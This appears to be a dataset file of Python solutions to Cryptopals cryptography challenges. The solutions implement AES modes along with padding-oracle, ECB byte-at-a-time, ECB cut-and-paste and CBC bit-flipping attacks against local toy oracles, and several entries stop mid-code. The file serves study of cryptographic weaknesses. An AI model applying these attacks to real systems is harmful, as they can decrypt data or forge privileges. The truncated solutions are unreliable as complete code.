AES-ECB\n    print(\"The ciphertext encrypted in ECB mode is the one at position\", result[0],\n          \"which contains\", result[1], \"repetitions\")\n\n    # Check that the detection works correctly\n    assert result[0] == 132\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S1C08"}
{"source": "cryptopals", "path": "data\\cryptopals\\S2C09.py", "category": "crypto", "solution_code": "def pkcs7_pad(message, block_size):\n    \"\"\"Pads the given message with the PKCS 7 padding format for the given block size.\"\"\"\n\n    # If the length of the given message is already equal to the block size, there is no need to pad\n    if len(message) == block_size:\n        return message\n\n    # Otherwise compute the padding byte and return the padded message\n    ch = block_size - len(message) % block_size\n    return message + bytes([ch] * ch)\n\n\ndef is_pkcs7_padded(binary_data):\n    \"\"\"Returns whether the data is PKCS 7 padded.\"\"\"\n\n    # Take what we expect to be the padding\n    padding = binary_data[-binary_data[-1]:]\n\n    # Check that all the bytes in the range indicated by the padding are equal to the padding value itself\n    return all(padding[b] == len(padding) for b in range(0, len(padding)))\n\n\ndef pkcs7_unpad(data):\n    \"\"\"Unpads the given data from its PKCS 7 padding and returns it.\"\"\"\n    if len(data) == 0:\n        raise Exception(\"The input data must contain at least one byte\")\n\n    if not is_pkcs7_padded(data):\n        return data\n\n    padding_len = data[len(data) - 1]\n    return data[:-padding_len]\n\n\ndef main():\n    message = b\"YELLOW SUBMARINE\"\n    b = pkcs7_pad(message, 20)\n\n    # Check that the padding and unpadding methods work properly\n    assert pkcs7_unpad(b) == message\n\n\nif __name__ == \"__main__\":\n    main()\n", "name": "S2C09"}
{"source": "cryptopals", "path": "data\\cryptopals\\S2C10.py", "category": "crypto", "solution_code": "from base64 import b64decode\nfrom Crypto.Cipher import AES\nfrom S2C09 import pkcs7_pad, pkcs7_unpad\nfrom S1C07 import aes_ecb_decrypt\n\n\ndef aes_ecb_encrypt(data, key):\n    \"\"\"Encrypts the given data with AES-ECB, using the given key.\n    The data is always PKCS 7 padded before being encrypted.\n    \"\"\"\n    cipher = AES.new(key, AES.MODE_ECB)\n    return cipher.encrypt(pkcs7_pad(data, AES.block_size))\n\n\ndef xor_data(binary_data_1, binary_data_2):\n    \"\"\"Returns the xor of the two binary arrays given.\"\"\"\n    return bytes([b1 ^ b2 for b1, b2 in zip(binary_data_1, binary_data_2)])\n\n\ndef aes_cbc_encrypt(data, key, iv):\n    \"\"\"Encrypts the given data with AES-CBC, using the given key and iv.\"\"\"\n    ciphertext = b''\n    prev = iv\n\n    # Process the encryption block by block\n    for i in range(0, len(data), AES.block_size):\n\n        # Always PKCS 7 pad the current plaintext block before proceeding\n        curr_plaintext_block = pkcs7_pad(data[i:i + AES.block_size], AES.block_size)\n        block_cipher_input = xor_data(curr_plaintext_block, prev)\n        encrypted_block = aes_ecb_encrypt(block_cipher_input, key)\n        ciphertext += encrypted_block\n        prev = encrypted_block\n\n    return ciphertext\n\n\ndef aes_cbc_decrypt(data, key, iv, unpad=True):\n    \"\"\"Decrypts the given AES-CBC encrypted data with the given key and iv.\n    Returns the unpadded decrypted message when unpad is true, or keeps the plaintext\n    padded when unpad is false.\n    \"\"\"\n    plaintext = b''\n    prev = iv\n\n    # Process the decryption block by block\n    for i in range(0, len(data), AES.block_size):\n        curr_ciphertext_block = data[i:i + AES.block_size]\n        decrypted_block = aes_ecb_decrypt(curr_ciphertext_block, key)\n        plaintext += xor_data(prev, decrypted_block)\n        prev = curr_ciphertext_block\n\n    # Return the plaintext either unpadded or left with the padding depending on the unpad flag\n    return pkcs7_unpad(plaintext) if unpad else plaintext\n\n\ndef main():\n    iv = b'\\x00' * AES.block_size\n    key = b'YELLOW SUBMARINE'\n    with open(\"S2C10_input.txt\") as input_file:\n        binary_data = b64decode(input_file.read())\n\n    # Compute and print the decrypted plaintext with the given input\n    print(aes_cbc_decrypt(binary_data, key, iv).decode().rstrip())\n\n    # Check that the encryption/decryption methods work fine with a custom input\n    custom_input = b'Trying to decrypt something else to see if it works.'\n    assert aes_cbc_decrypt(aes_cbc_encrypt(custom_input, key, iv), key, iv) == custom_input\n\nif __name__ == '__main__':\n    main()\n", "name": "S2C10"}
{"source": "cryptopals", "path": "data\\cryptopals\\S2C11.py", "category": "crypto", "solution_code": "from S1C08 import count_aes_ecb_repetitions\nfrom S2C10 import aes_ecb_encrypt, aes_cbc_encrypt\nfrom random import randint\nfrom Crypto.Cipher.AES import block_size\nfrom Crypto import Random\n\n\nclass AesEncryptionOracle:\n    \"\"\"Oracle which encrypts the given data using every time a random AES method (chosen between ECB and CBC),\n    a random key, a random iv (in case of CBC) and also adds a random padding before and after the plaintext.\n    \"\"\"\n\n    @staticmethod\n    def encrypt(plaintext):\n        # Add a random padding before and after the plaintext\n        padded_plaintext = AesEncryptionOracle._pad_with_bytes(plaintext)\n\n        # Generate a random key\n        key = Random.new().read(block_size)\n\n        # Encrypt randomly with ECB or CBC\n        if randint(0, 1) == 0:\n            return \"ECB\", aes_ecb_encrypt(padded_plaintext, key)\n        else:\n            return \"CBC\", aes_cbc_encrypt(padded_plaintext, key, Random.new().read(block_size))\n\n    @staticmethod\n    def _pad_with_bytes(binary_data):\n        \"\"\"Returns the given binary_data with a padded with a short random prefix and suffix.\"\"\"\n        return Random.new().read(randint(5, 10)) + binary_data + Random.new().read(randint(5, 10))\n\n\ndef detect_cipher(ciphertext):\n    \"\"\"Detects if the given ciphertext was encrypted with ECB or CBC mode.\"\"\"\n\n    # When there are some repeated chunks in the ciphertext, it is most likely becaues\n    # it wes encrypted with ECB\n    if count_aes_ecb_repetitions(ciphertext) > 0:\n        return \"ECB\"\n    else:\n        return \"CBC\"\n\n\ndef main():\n    oracle = AesEncryptionOracle()\n\n    # We choose a repeating input data so that we will be able to detect\n    # repetitions in the ciphertext (if it's encrypted with ECB) later.\n    input_data = bytes([0]*64)\n\n    # Check that the detection method works correctly\n    for _ in range(1000):\n        encryption_used, ciphertext = oracle.encrypt(input_data)\n        encryption_detected = detect_cipher(ciphertext)\n        assert encryption_used == encryption_detected\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S2C11"}
{"source": "cryptopals", "path": "data\\cryptopals\\S2C12.py", "category": "crypto", "solution_code": "from base64 import b64decode\nfrom S2C10 import aes_ecb_encrypt\nfrom S2C09 import pkcs7_unpad\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\nfrom S1C08 import count_aes_ecb_repetitions\n\n\nclass ECBOracle:\n    \"\"\"This oracle uses always the same key (generated during the initialization).\"\"\"\n\n    def __init__(self, secret_padding):\n        self._key = Random.new().read(AES.key_size[0])\n        self._secret_padding = secret_padding\n\n    def encrypt(self, data):\n        \"\"\"Encrypts with AES-128-ECB mode, after appending a fixed (given) string to every plaintext\"\"\"\n        return aes_ecb_encrypt(data + self._secret_padding, self._key)\n\n\ndef find_block_length(encryption_oracle):\n    \"\"\"Returns the length of a block for the block cipher used by the encryption_oracle.\n    To find the length of a block, we encrypt increasingly longer plaintexts until the size of the\n    output ciphertext increases too. When this happens, we can then easily compute the length of a\n    block as the difference between this new length of the ciphertext and its initial one.\n    \"\"\"\n    my_text = b''\n    ciphertext = encryption_oracle.encrypt(my_text)\n    initial_len = len(ciphertext)\n    new_len = initial_len\n\n    while new_len == initial_len:\n        my_text += b'A'\n        ciphertext = encryption_oracle.encrypt(my_text)\n        new_len = len(ciphertext)\n\n    return new_len - initial_len\n\n\ndef get_next_byte(block_length, curr_decrypted_message, encryption_oracle):\n    \"\"\"Finds the next byte of the mysterious message that the oracle is appending to our plaintext.\"\"\"\n\n    # Compute the number of characters that we want to use as input to have the first unknown\n    # character of the mysterious message at the end of a block\n    length_to_use = (block_length - (1 + len(curr_decrypted_message))) % block_length\n    prefix = b'A' * length_to_use\n\n    # Compute the number of bytes that we will take from the fake and from the real ciphertexts\n    # to compare them. We will ignore everything is beyond the byte we are trying to discover.\n    cracking_length = length_to_use + len(curr_decrypted_message) + 1\n\n    # Compute the real ciphertext that the oracle would output with the prefix we computed\n    real_ciphertext = encryption_oracle.encrypt(prefix)\n\n    # For each possible character\n    for i in range(256):\n\n        # Compute our fake ciphertext, trying to obtain the same as the real ciphertext\n        fake_ciphertext = encryption_oracle.encrypt(prefix + curr_decrypted_message + bytes([i]))\n\n        # If we found a character that, used in our fake input, let us obtain the same ciphertext\n        if fake_ciphertext[:cracking_length] == real_ciphertext[:cracking_length]:\n\n            # Return that character as the next byte of the message\n            return bytes([i])\n\n    # If there was no match (most likely due to padding), return empty byte\n    return b''\n\n\ndef byte_at_a_time_ecb_decryption_simple(encryption_oracle):\n    \"\"\"Performs the byte-at-a-time ECB decryption attack to discover the secret padding used by the oracle.\"\"\"\n\n    # Find the block length\n    block_length = find_block_length(encryption_oracle)\n\n    # To detect if the oracle encrypts with ECB mode, we can encrypt a big enough (more\n    # than three block sizes) plaintext of identical bytes. If the ciphertext presents\n    # repeated blocks then we can deduct that it is very likely using ECB.\n    ciphertext = encryption_oracle.encrypt(bytes([0] * 64))\n    assert count_aes_ecb_repetitions(ciphertext) > 0\n\n    # The number of bytes that we have to decrypt by breaking the encryption oracle\n    # will be equal to the length of the ciphertext when we encrypt an empty message.\n    mysterious_text_length = len(encryption_oracle.encrypt(b''))\n\n    # At this point we have all the information that we need to crack the ECB\n    # encryption oracle byte by byte.\n    secret_padding = b''\n    for i in range(mysterious_text_length):\n        secret_padding += get_next_byte(block_length, secret_padding, encryption_oracle)\n\n    # Return the complete padding as bytes\n    return secret_padding\n\n\ndef main():\n    \"\"\"Approach:\n    1) Find the block_length and the encryption mode\n    2) Decrypt byte-by-byte the mysterious message\n    \"\"\"\n    secret_padding = b64decode(\"Um9sbGluJyBpbiBteSA1LjAKV2l0aCBteSByYWctdG9wIGRvd24gc28gbXkgaGF\"\n                               \"pciBjYW4gYmxvdwpUaGUgZ2lybGllcyBvbiBzdGFuZGJ5IHdhdmluZyBqdXN0IH\"\n                               \"RvIHNheSBoaQpEaWQgeW91IHN0b3A/IE5vLCBJIGp1c3QgZHJvdmUgYnkK\")\n    oracle = ECBOracle(secret_padding)\n    discovered_secret_padding = byte_at_a_time_ecb_decryption_simple(oracle)\n\n    # Check if the attack works correctly\n    assert pkcs7_unpad(discovered_secret_padding) == secret_padding\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S2C12"}
{"source": "cryptopals", "path": "data\\cryptopals\\S2C13.py", "category": "crypto", "solution_code": "from S2C10 import aes_ecb_encrypt, aes_ecb_decrypt\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\n\n\nclass ECBOracle:\n    \"\"\"This oracle uses the same key (randomly generated at initialization) every time.\"\"\"\n\n    def __init__(self):\n        self._key = Random.new().read(AES.key_size[0])\n\n    def encrypt(self, email):\n        \"\"\"Encrypts with AES-128-ECB the encoded user profile generated with the given email.\"\"\"\n        encoded = kv_encode(profile_for(email))\n        bytes_to_encrypt = encoded.encode()\n        return aes_ecb_encrypt(bytes_to_encrypt, self._key)\n\n    def decrypt(self, ciphertext):\n        \"\"\"Decrypts the given ciphertext with the random key.\"\"\"\n        return aes_ecb_decrypt(ciphertext, self._key)\n\n\ndef kv_encode(dict_object):\n    \"\"\"Encodes a dictionary object to a string with the kv encoding format.\n\n    For example, given this input:\n    {\n        foo: 'bar',\n        baz: 'qux',\n        zap: 'zazzle'\n    }\n    The function will return this string:\n        foo=bar&baz=qux&zap=zazzle\n    \"\"\"\n    encoded_text = ''\n    for item in dict_object.items():\n        encoded_text += item[0] + '=' + str(item[1]) + '&'\n\n    # Return the encoded string without the last '&' character\n    return encoded_text[:-1]\n\n\ndef kv_parse(encoded_text):\n    \"\"\"Decodes a kv encoded (see function above) string to a dictionary object\"\"\"\n    output = {}\n    attributes = encoded_text.split('&')\n\n    # Add each attribute to the dictionary, converting it to int if it is a digit\n    for attribute in attributes:\n        values = attribute.split('=')\n        key = int(values[0]) if values[0].isdigit() else values[0]\n        value = int(values[1]) if values[1].isdigit() else values[1]\n        output[key] = value\n\n    return output\n\n\ndef profile_for(email):\n    \"\"\"Encodes a user profile in the kv encoding format, given an email address.\"\"\"\n    email = email.replace('&', '').replace('=', '')     # Remove special characters to avoid injection\n    return {\n        'email': email,\n        'uid': 10,\n        'role': 'user'\n    }\n\n\ndef ecb_cut_and_paste(encryption_oracle):\n    \"\"\"By cutting and pasting pieces of ciphertexts, forces a ciphertext of an admin user\"\"\"\n\n    # The first plaintext that will be encrypted is:\n    # block 1:           block 2 (pkcs7 padded):                             and (omitting the padding):\n    # email=xxxxxxxxxx   admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b   &uid=10&role=user\n    prefix_len = AES.block_size - len(\"email=\")\n    suffix_len = AES.block_size - len(\"admin\")\n    email1 = 'x' * prefix_len + \"admin\" + (chr(suffix_len) * suffix_len)\n    encrypted1 = encryption_oracle.encrypt(email1)\n\n    # The second plaintext that will be encrypted is:\n    # block 1:           block 2:           block 3\n    # email=master@me.   com&uid=10&role=   user\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\\x0c\n    email2 = \"master@me.com\"\n    encrypted2 = encryption_oracle.encrypt(email2)\n\n    # The forced ciphertext will cut and paste the previous ciphertexts to be decrypted as:\n    # block 1:           block 2:           block 3:\n    # email=master@me.   com&uid=10&role=   admin\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\\x0b\n    forced = encrypted2[:32] + encrypted1[16:32]\n\n    return forced\n\n\ndef main():\n    \"\"\"Approach: use ecb cut and paste technique\"\"\"\n    oracle = ECBOracle()\n    forced_ciphertext = ecb_cut_and_paste(oracle)\n\n    # Check that the attack works properly\n    decrypted = oracle.decrypt(forced_ciphertext)\n    parsed = kv_parse(decrypted.decode())\n    assert parsed['role'] == 'admin'\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S2C13"}
{"source": "cryptopals", "path": "data\\cryptopals\\S2C14.py", "category": "crypto", "solution_code": "from base64 import b64decode\nfrom S2C10 import aes_ecb_encrypt\nfrom S2C09 import pkcs7_unpad\nfrom random import randint\nfrom Crypto import Random\nfrom S1C08 import count_aes_ecb_repetitions\nfrom S2C12 import find_block_length, ECBOracle\n\n\nclass HarderECBOracle(ECBOracle):\n\n    def __init__(self, secret_padding):\n        super(HarderECBOracle, self).__init__(secret_padding)\n        self._random_prefix = Random.new().read(randint(0, 255))\n\n    def encrypt(self, data):\n        \"\"\"Encrypts with AES-128-ECB mode, after prepending a fixed (randomly-generated) string\n        and appending a fixed (given) string to every plaintext.\n        \"\"\"\n        return aes_ecb_encrypt(self._random_prefix + data + self._secret_padding, self._key)\n\n\ndef get_next_byte(prefix_length, block_length, curr_decrypted_message, encryption_oracle):\n    \"\"\"Finds the next byte of the mysterious message that the oracle\n    is appending to our plaintext.\n    \"\"\"\n\n    # Compute the number of characters that we want to use as input to have the first unknown\n    # character of the mysterious message at the end of a block\n    length_to_use = (block_length - prefix_length - (1 + len(curr_decrypted_message))) % block_length\n    my_input = b'A' * length_to_use\n\n    # Compute the number of bytes that we will take from the fake and from the real ciphertexts\n    # to compare them. We will ignore everything is beyond the byte we are trying to discover.\n    cracking_length = prefix_length + length_to_use + len(curr_decrypted_message) + 1\n\n    # Compute the real ciphertext that the oracle would output with my input\n    real_ciphertext = encryption_oracle.encrypt(my_input)\n\n    # For each possible character\n    for i in range(256):\n\n        # Compute our fake ciphertext, trying to obtain the same as the real ciphertext\n        fake_ciphertext = encryption_oracle.encrypt(my_input + curr_decrypted_message + bytes([i]))\n\n        # If we found a character that, used in our fake input, let us obtain the same ciphertext\n        if fake_ciphertext[:cracking_length] == real_ciphertext[:cracking_length]:\n\n            # Return that character as the next byte of the message\n            return bytes([i])\n\n    # If there was no match (most likely due to padding), return empty byte\n    return b''\n\n\ndef has_equal_block(ciphertext, block_length):\n    \"\"\"Checks if the given ciphertext contains two consecutive equal blocks\"\"\"\n    for i in range(0, len(ciphertext) - 1, block_length):\n        if ciphertext[i:i+block_length] == ciphertext[i+block_length:i+2*block_length]:\n            return True\n\n    return False\n\n\ndef find_prefix_length(encryption_oracle, block_length):\n    \"\"\"Finds the length of the randomly generated prefix that the encryption oracle\n    adds to every plaintext before encrypting. First, the block where the prefix ends\n    is searched; then the precise index where the prefix ends is searched.\n    \"\"\"\n\n    # To find the index of the block where the prefix ends, we use the oracle to encrypt\n    # an empty message and a 1 character message. Then we use them to find it as explained below.\n    ciphertext1 = encryption_oracle.encrypt(b'')\n    ciphertext2 = encryption_oracle.encrypt(b'a')\n\n    # The first block where the two ciphertexts differ will be the block where the\n    # prefix (which was the same for both the inputs) ended.\n    prefix_length = 0\n    for i in range(0, len(ciphertext2), block_length):\n        if ciphertext1[i:i+block_length] != ciphertext2[i:i+block_length]:\n            prefix_length = i\n            break\n\n    # Now, to find the precise index where the prefix ended, we will encrypt identical bytes,\n    # in a number equal to two block_lengths, and we will increase this amount by an incremental\n    # offset to see when those bytes will be shifted to be autonomous blocks (thus encrypted the same way)\n    for i in range(block_length):\n        fake_input = bytes([0] * (2 * block_length + i))\n        ciphertext = encryption_oracle.encrypt(fake_input)\n\n        # If the bytes have shifted enough, we can compute the precise index where the prefix ends\n        # inside its last block, which is going to be equal to block_length - i\n        if has_equal_block(ciphertext, block_length):\n            return prefix_length + block_length - i if i != 0 else prefix_length\n\n    raise Exception('The oracle is not using ECB')\n\n\ndef byte_at_a_time_ecb_decryption_harder(encryption_oracle):\n    \"\"\"Performs the byte-at-a-time ECB decryption attack to discover the secret padding used by the oracle.\"\"\"\n\n    # Find the block length\n    block_length = find_block_length(encryption_oracle)\n\n    # To detect if the oracle encrypts with ECB mode, we can encrypt a big enough (more\n    # than three block sizes) plaintext of identical bytes. If the ciphertext presents\n    # repeated blocks then we can deduct that it is very likely using ECB.\n    ciphertext = encryption_oracle.encrypt(bytes([0] * 64))\n    assert count_aes_ecb_repetitions(ciphertext) > 0\n\n    # The number of bytes", "name": "S2C14"}
{"source": "cryptopals", "path": "data\\cryptopals\\S2C15.py", "category": "crypto", "solution_code": "from S2C09 import is_pkcs7_padded\n\n\ndef main():\n    \"\"\"I had implemented the is_pkcs_padded method before, so I will just reuse it here.\"\"\"\n    assert is_pkcs7_padded(b'ICE ICE BABY\\x04\\x04\\x04\\x04') is True\n    assert is_pkcs7_padded(b'ICE ICE BABY\\x05\\x05\\x05\\x05') is False\n    assert is_pkcs7_padded(b'ICE ICE BABY\\x01\\x02\\x03\\x04') is False\n    assert is_pkcs7_padded(b'ICE ICE BABY') is False\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S2C15"}
{"source": "cryptopals", "path": "data\\cryptopals\\S2C16.py", "category": "crypto", "solution_code": "from S2C10 import aes_cbc_encrypt, aes_cbc_decrypt\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\n\n\nclass Oracle:\n\n    def __init__(self):\n        self._key = Random.new().read(AES.key_size[0])\n        self._iv = Random.new().read(AES.block_size)\n        self._prefix = \"comment1=cooking%20MCs;userdata=\"\n        self._suffix = \";comment2=%20like%20a%20pound%20of%20bacon\"\n\n    def encrypt(self, data):\n        \"\"\"Adds the prefix and the suffix specified in the challenge and encrypts the data with AES-128-CBC\"\"\"\n        data = data.replace(';', '').replace('=', '')  # Remove special characters to avoid injection\n        plaintext = (self._prefix + data + self._suffix).encode()\n        return aes_cbc_encrypt(plaintext, self._key, self._iv)\n\n    def decrypt_and_check_admin(self, ciphertext):\n        \"\"\"Decrypts the string and returns whether the characters \";admin=true;\" are in the string\"\"\"\n        data = aes_cbc_decrypt(ciphertext, self._key, self._iv)\n        return b';admin=true;' in data\n\n\ndef find_block_length(encryption_oracle):\n    \"\"\"Returns the length of a block for the block cipher used by the encryption_oracle.\n    To find the length of a block, we encrypt increasingly longer plaintexts until the size of the\n    output ciphertext increases too. When this happens, we can then easily compute the length of a block\n    as the difference between this new length of the ciphertext and its initial one.\n    \"\"\"\n    my_text = ''\n    ciphertext = encryption_oracle(my_text)\n    initial_len = len(ciphertext)\n    new_len = initial_len\n\n    while new_len == initial_len:\n        my_text += 'A'\n        ciphertext = encryption_oracle(my_text)\n        new_len = len(ciphertext)\n\n    return new_len - initial_len\n\n\ndef find_prefix_length(encryption_oracle, block_length):\n    \"\"\"Returns the length of the prefix that the encryption oracle prepends to every plaintext.\"\"\"\n\n    # Encrypt two different ciphertexts\n    ciphertext_a = encryption_oracle('A')\n    ciphertext_b = encryption_oracle('B')\n\n    # Find their common length\n    common_len = 0\n    while ciphertext_a[common_len] == ciphertext_b[common_len]:\n        common_len += 1\n\n    # Make sure that the common length is multiple of the block length\n    common_len = int(common_len / block_length) * block_length\n\n    # Try to add an increasing number of common bytes to the plaintext till they until\n    # the two ciphertexts will have one extra identical block\n    for i in range(1, block_length + 1):\n        ciphertext_a = encryption_oracle('A' * i + 'X')\n        ciphertext_b = encryption_oracle('A' * i + 'Y')\n\n        # If there is one more identical block, it will mean that by adding i bytes\n        # we made the common input (including prefix) to the same length multiple of\n        # a block size. Then we can easily get the length of the prefix.\n        if ciphertext_a[common_len:common_len + block_length] == ciphertext_b[common_len:common_len + block_length]:\n            return common_len + (block_length - i)\n\n\ndef cbc_bit_flip(encryption_oracle):\n    \"\"\"Performs a CBC bit flipping attack to accomplish admin privileges in the decrypted data.\"\"\"\n\n    # Get the length of a block and the length of the prefix\n    block_length = find_block_length(encryption_oracle.encrypt)\n    prefix_length = find_prefix_length(encryption_oracle.encrypt, block_length)\n\n    # Compute the number of bytes to add to the prefix to make its length a multiple of block_length\n    additional_prefix_bytes = (block_length - (prefix_length % block_length)) % block_length\n    total_prefix_length = prefix_length + additional_prefix_bytes\n\n    # Compute the number of bytes to add to the plaintext to make its length a multiple of block length\n    plaintext = \"?admin?true\"\n    additional_plaintext_bytes = (block_length - (len(plaintext) % block_length)) % block_length\n\n    # Make the plaintext long one block_length and encrypt it\n    final_plaintext = additional_plaintext_bytes * '?' + plaintext\n    ciphertext = encryption_oracle.encrypt(additional_prefix_bytes * '?' + final_plaintext)\n\n    # Because XORing a byte with itself produces zero, we can produce the byte that we want\n    # by changing the bytes of the block before the plaintext\n    semicolon = ciphertext[total_prefix_length - 11] ^ ord('?') ^ ord(';')\n    equals = ciphertext[total_prefix_length - 5] ^ ord('?') ^ ord('=')\n\n    # Put the pieces of our forged ciphertext together to generate the full ciphertext\n    forced_ciphertext = ciphertext[:total_prefix_length - 11] + bytes([semicolon]) + \\\n                        ciphertext[total_prefix_length - 10: total_prefix_length - 5] + \\\n                        bytes([equals]) + ciphertext[total_prefix_length - 4:]\n\n    return forced_ciphertext\n\n\ndef main():\n    encryption_oracle = Oracle()\n    forced_ciphertext = cbc_bit_flip(encryption_oracle)\n\n    # Check if the ciphertext was forced properly\n    assert encryption_oracle.decrypt_and_check_admin(forced_ciphertext)\n\n\nif __name__ == '__main__':\n    ", "name": "S2C16"}
{"source": "cryptopals", "path": "data\\cryptopals\\S3C17.py", "category": "crypto", "solution_code": "from S2C09 import is_pkcs7_padded, pkcs7_unpad\nfrom S2C10 import aes_cbc_encrypt, aes_cbc_decrypt\nfrom random import randint\nfrom Crypto import Random\nfrom Crypto.Cipher.AES import block_size, key_size\nfrom base64 import b64decode\n\n\nclass Oracle:\n\n    def __init__(self, possible_inputs):\n        self.iv = Random.new().read(block_size)\n        self._key = Random.new().read(key_size[0])\n        self._possible_inputs = possible_inputs\n\n    def get_encrypted_message(self):\n        \"\"\"Selects at random one of the 10 input strings and encrypts it under a random key and IV with AES-128-CBC.\"\"\"\n        chosen_input = self._possible_inputs[randint(0, len(self._possible_inputs) - 1)].encode()\n        return aes_cbc_encrypt(chosen_input, self._key, self.iv)\n\n    def decrypt_and_check_padding(self, ciphertext, iv):\n        \"\"\"Decrypts the given ciphertext with the given IV and with the random key generated before\n        by the encryption oracle. Returns True if the decrypted plaintext is pkcs7 padded correctly.\n        \"\"\"\n        plaintext = aes_cbc_decrypt(ciphertext, self._key, iv, False)\n        return is_pkcs7_padded(plaintext)\n\n\ndef create_forced_previous_block(iv, guessed_byte, padding_len, found_plaintext):\n    \"\"\"Creates a forced block of the ciphertext, ideally to be given as IV to decrypt the following block.\n    The forced IV will be used for the attack on the padding oracle CBC encryption.\n    \"\"\"\n\n    # Get the index of the first character of the padding\n    index_of_forced_char = len(iv) - padding_len\n\n    # Using the guessed byte given as input, try to force the first character of the\n    # padding to be equal to the length of the padding itself\n    forced_character = iv[index_of_forced_char] ^ guessed_byte ^ padding_len\n\n    # Form the forced ciphertext by adding to it the forced character...\n    output = iv[:index_of_forced_char] + bytes([forced_character])\n\n    # ...and the characters that were forced before (for which we already know the plaintext)\n    m = 0\n    for k in range(block_size - padding_len + 1, block_size):\n\n        # Force each of the following characters of the IV so that the matching characters in\n        # the following block will be decrypted to \"padding_len\"\n        forced_character = iv[k] ^ found_plaintext[m] ^ padding_len\n        output += bytes([forced_character])\n        m += 1\n\n    return output\n\n\ndef attack_padding_oracle(ciphertext, oracle):\n    \"\"\"Decrypts the given ciphertext by using the padding oracle CBC encryption attack.\"\"\"\n    plaintext = b''\n\n    # Split the ciphertext in blocks of the AES block_size (which can get it from the IV too)\n    ciphertext_blocks = [oracle.iv] + [ciphertext[i:i + block_size] for i in range(0, len(ciphertext), block_size)]\n\n    for c in range(1, len(ciphertext_blocks)):\n        plaintext_block = b''   # This is the part of plaintext corresponding to each ciphertext block\n\n        # Take each character of the ciphertext block (starting from the last one)\n        # and decrypt it by forcing the previous block as IV.\n        for i in range(block_size - 1, -1, -1):\n\n            # The padding len for the current character will depend on how many characters of this\n            # block (starting from the right), we have already decrypted.\n            padding_len = len(plaintext_block) + 1\n\n            # Find each possible character which gives us a correct padding\n            possible_last_bytes = []\n            for j in range(256):\n\n                # Create a IV with the guessed character j\n                forced_iv = create_forced_previous_block(ciphertext_blocks[c - 1], j, padding_len, plaintext_block)\n\n                # If the guessed character j gave us a working padding, save it as one of the candidates\n                if oracle.decrypt_and_check_padding(ciphertext_blocks[c], forced_iv) is True:\n                    possible_last_bytes += bytes([j])\n\n            # In case of ambiguity, if we found more than one candidate, we can choose the best by trying\n            # to force the next character too.\n            #\n            # This is useful because, for example, if we were trying to find the last character\n            # of this plaintext (which was already padded):\n            #\n            #     123456789012/x04/x04/x04/x04\n            #\n            # There would be two possible last characters that form a valid padding (/x01 and /x04).\n            # However if we try the next character too, we can easily choose the correct one.\n            if len(possible_last_bytes) != 1:\n                for byte in possible_last_bytes:\n                    for j in range(256):\n                        forced_iv = create_forced_previous_block(ciphertext_blocks[c - 1], j, padding_len + 1,\n                                                                 bytes([byte]) + plaintext_block)\n\n                        # If we manage to get a valid padding, then it's very likely that this\n                        # candidate is the one that we want. So exclude the o", "name": "S3C17"}
{"source": "cryptopals", "path": "data\\cryptopals\\S3C18.py", "category": "crypto", "solution_code": "from S2C10 import aes_ecb_encrypt, xor_data\nfrom base64 import b64decode\nfrom Crypto.Cipher import AES\nimport struct\n\n\ndef aes_ctr(data, key, nonce):\n    \"\"\"Encrypts or decrypts with AES-CTR mode.\"\"\"\n    output = b''\n    counter = 0\n\n    # Takes a block size of input at each time (or less if a block-size is not available), and XORs\n    # it with the encrypted concatenation of nonce and counter.\n    while data:\n\n        # Get the little endian bytes concatenation of nonce and counter (each 64bit values)\n        concatenated_nonce_and_counter = struct.pack('<QQ', nonce, counter)\n\n        # Encrypt the concatenation of nonce and counter\n        encrypted_counter = aes_ecb_encrypt(concatenated_nonce_and_counter, key)\n\n        # XOR the encrypted value with the input data\n        output += xor_data(encrypted_counter, data[:AES.block_size])\n\n        # Update data to contain only the values that haven't been encrypted/decrypted yet\n        data = data[AES.block_size:]\n\n        # Update the counter as prescribed in the CTR mode of operation\n        counter += 1\n\n    return output\n\n\ndef main():\n\n    # Check if the AES CTR encryption / decryption works correctly with the given example\n    ciphertext = b64decode(\"L77na/nrFsKvynd6HzOoG7GHTLXsTVu9qvY/2syLXzhPweyyMTJULu/6/kXX0KSvoOLSFQ==\")\n    assert aes_ctr(ciphertext, b'YELLOW SUBMARINE', 0) == b\"Yo, VIP Let's kick it Ice, Ice, baby Ice, Ice, baby \"\n\n    # Check if it works also for a custom case\n    message = b'Hey hello this is a test'\n    key = b'A key of 8 bytes'\n    nonce = 15\n    assert aes_ctr(aes_ctr(message, key, nonce), key, nonce) == message\n\n\nif __name__ == '__main__':\n    main()\n", "name": "S3C18"}
{"source": "cryptopals", "path": "data\\cryptopals\\S3C19.py", "category": "crypto", "solution_code": "from S1C03 import get_english_score, singlechar_xor\nfrom Crypto import Random\nfrom Crypto.Cipher import AES\nfrom base64 import b64decode\nfrom S3C18 import aes_ctr\nfrom S2C10 import xor_data\n\n\ndef get_keystream_byte(data):\n    \"\"\"Finds the most probable byte to which the input data was XORed, using the\n    frequencies of English letters as metric.\n    \"\"\"\n    best_candidate, score = 0, 0\n\n    # Try all possible bytes\n    for key_candidate in range(256):\n\n        # Get the score of the current byte\n        curr_score = get_english_score(singlechar_xor(data, key_candidate))\n\n        # And keep the byte with the highest score as best candidate\n        if curr_score > score:\n            score = curr_score\n            best_candidate = key_candidate\n\n    return bytes([best_candidate])\n\n\ndef crack_ctr_same_nonce(ciphertexts):\n    \"\"\"Attempt to automate the process of cracking AES-CTR when the same nonce is used repeatedly.\n    The approach is to take all the bytes that were encrypted with the same byte of the keystream\n    and use the singlechar_xor crypto hack that we used before to find each byte of the key.\n    \"\"\"\n    keystream = b''\n\n    # Take the i-th character of each ciphertext to form a column of bytes that were XORed against the same byte\n    for i in range(max(map(len, ciphertexts))):\n        column = b''\n        for c in ciphertexts:\n            column += bytes([c[i]]) if i < len(c) else b''\n\n        # Get the most likely character that was used for the XOR\n        keystream += get_keystream_byte(column)\n\n    # Once we got the keystream, get we can easily get all the 